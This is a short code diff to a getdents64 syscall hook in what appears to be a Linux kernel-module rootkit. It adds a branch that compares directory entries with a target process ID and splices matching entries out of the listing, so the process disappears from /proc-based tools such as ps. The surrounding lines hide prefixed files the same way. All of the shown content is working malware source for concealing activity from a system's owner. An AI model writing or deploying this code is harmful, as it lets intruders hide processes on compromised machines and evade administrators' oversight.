@@ -217,6 +217,19 @@ static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *di
              * the contents, the current directory is subsumed into that of whatever preceeds it. */
             previous_dir->d_reclen += current_dir->d_reclen;
         }
+        else if ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) != 0))
+        {
+            if (current_dir == dirent_ker)
+            {
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            /* This is the crucial step: we add the length of the current directory to that of the
+             * previous one. This means that when the directory structure is looped over to print/search
+             * the contents, the current directory is subsumed into that of whatever preceeds it. */
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
         else
         {
             /* If we end up here, then we didn't find PREFIX in current_dir->d_name
